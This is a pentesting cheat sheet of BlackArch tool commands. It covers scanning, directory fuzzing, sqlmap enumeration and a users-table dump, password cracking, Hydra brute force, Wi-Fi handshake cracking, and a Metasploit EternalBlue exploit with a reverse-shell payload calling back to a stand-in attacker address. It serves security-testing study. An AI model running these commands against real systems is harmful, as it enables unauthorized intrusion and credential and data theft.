# BlackArch Tool Usage Cheat Sheet

## Network Scanning

### Nmap
```bash
# Basic scan
nmap -sV target.com

# Full port scan
nmap -p- -sV -O target.com

# Stealth SYN scan
nmap -sS target.com

# UDP scan
nmap -sU target.com

# Aggressive scan
nmap -A target.com

# Save output
nmap -sV target.com -oN scan.txt
```

### Masscan
```bash
# Fast port scan
masscan -p1-65535 target.com --rate=1000
```

## Web Application

### Directory Enumeration
```bash
# Dirsearch
python3 dirsearch.py -u http://target.com -e php,html,js

# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# FFUF
ffuf -w wordlist.txt -u http://target.com/FUZZ
```

### SQL Injection
```bash
# Auto-detect
sqlmap -u "http://target.com/page.php?id=1"

# Get databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# Dump data
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump
```

### Nikto
```bash
# Basic scan
nikto -h http://target.com

# With evasion
nikto -h http://target.com -evasion 1

# With proxy
nikto -h http://target.com -p 8080
```

### Nuclei
```bash
# Scan with templates
nuclei -u http://target.com

# Specific templates
nuclei -u http://target.com -t cves/

# Update templates
nuclei -update-templates
```

## Password Attacks

### Hashcat
```bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# Bruteforce
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a

# Show results
hashcat -m 0 hash.txt --show
```

### John
```bash
# Basic
john --wordlist=rockyou.txt hash.txt

# Show results
john --show hash.txt

# Formats
john --format=md5 hash.txt
```

### Hydra
```bash
# SSH
hydra -l admin -P password.txt ssh://target.com

# HTTP Form
hydra -l admin -P password.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Wireless

### Aircrack-ng
```bash
# Monitor mode
airmon-ng start wlan0

# Capture
airodump-ng wlan0mon

# Capture handshake
airodump-ng -w capture -c 1 --bssid MAC wlan0mon

# Crack
aircrack-ng -w wordlist.txt capture.cap
```

## Information Gathering

### theHarvester
```bash
theHarvester -d target.com -b google
```

### Recon-ng
```bash
recon-ng
marketplace install all
workspaces create test
modules load recon/domains-contacts/google
run
```

## Exploitation

### Metasploit
```bash
msfconsole

# Search
search type:exploit name:smb

# Use
use exploit/windows/smb/ms17_010_eternalblue

# Options
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip

# Run
exploit
```

## Tags
#blackarch #cheatsheet #pentesting #tools
